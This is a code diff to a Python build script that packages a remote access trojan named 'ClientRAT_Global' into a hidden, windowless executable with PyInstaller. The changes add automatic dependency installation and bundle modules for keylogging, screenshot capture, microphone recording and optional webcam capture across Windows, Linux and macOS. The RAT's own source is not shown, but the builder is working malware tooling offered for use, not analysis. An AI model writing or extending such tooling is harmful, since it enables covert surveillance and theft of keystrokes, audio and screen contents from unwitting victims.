@@ -86,6 +86,18 @@ def main():
     except ImportError:
         print("[*] Installing PyInstaller...")
         subprocess.check_call([sys.executable, "-m", "pip", "install", "pyinstaller", "-q"])
+    
+    print("[*] Checking extra dependencies for build...")
+    extra_pkgs = []
+    for mod, pkg in [("pynput", "pynput"), ("sounddevice", "sounddevice"), ("PIL", "Pillow")]:
+        try:
+            __import__(mod)
+        except ImportError:
+            extra_pkgs.append(pkg)
+    if extra_pkgs:
+        print(f"[*] Installing: {', '.join(extra_pkgs)}...")
+        subprocess.check_call([sys.executable, "-m", "pip", "install", "-q"] + extra_pkgs)
+        print("[+] Dependencies installed")
             
     print("\n[*] Building executable... Please wait (this takes about 15 seconds)...")
     
@@ -94,6 +106,28 @@ def main():
         "--onefile",
         "--noconsole",
         "--name", "ClientRAT_Global",
+        # ── Screenshot (Pillow) ─────────────────────────────────────────────
+        "--hidden-import", "PIL",
+        "--hidden-import", "PIL.ImageGrab",
+        "--hidden-import", "PIL.Image",
+        "--hidden-import", "PIL.ImageTk",
+        "--hidden-import", "PIL.ImageFilter",
+        "--hidden-import", "PIL.ImageEnhance",
+        # ── Screenshot fallback (mss) ──────────────────────────────────────
+        "--hidden-import", "mss",
+        # ── Microphone (sounddevice + numpy) ────────────────────────────────
+        "--hidden-import", "sounddevice",
+        "--hidden-import", "_sounddevice_data",
+        "--hidden-import", "numpy",
+        # ── Keylog (pynput) ─────────────────────────────────────────────────
+        "--hidden-import", "pynput",
+        "--hidden-import", "pynput.keyboard",
+        "--hidden-import", "pynput.keyboard._win32",
+        "--hidden-import", "pynput.keyboard._xorg",
+        "--hidden-import", "pynput.keyboard._darwin",
+        "--hidden-import", "pynput.mouse",
+        # ── Webcam (opencv-python) — optional (adds ~50MB) ─────────────────
+        #"--hidden-import", "cv2",           # Uncomment if webcam is needed
         temp_file
     ]
     
@@ -104,7 +138,7 @@ def main():
         print("   Location: ./dist/ClientRAT_Global.exe        ")
         print("[+] ========================================= [+]")
     except subprocess.CalledProcessError as e:
-        print(f"\n[-] Build failed.")
+        print(f"\n[-] Build failed (error code: {e.returncode}).")
     finally:
         if os.path.exists(temp_file):
             os.remove(temp_file)
